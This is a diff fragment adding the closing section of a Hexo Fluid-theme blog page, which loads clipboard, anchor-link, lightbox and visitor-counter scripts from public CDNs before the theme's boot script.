+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
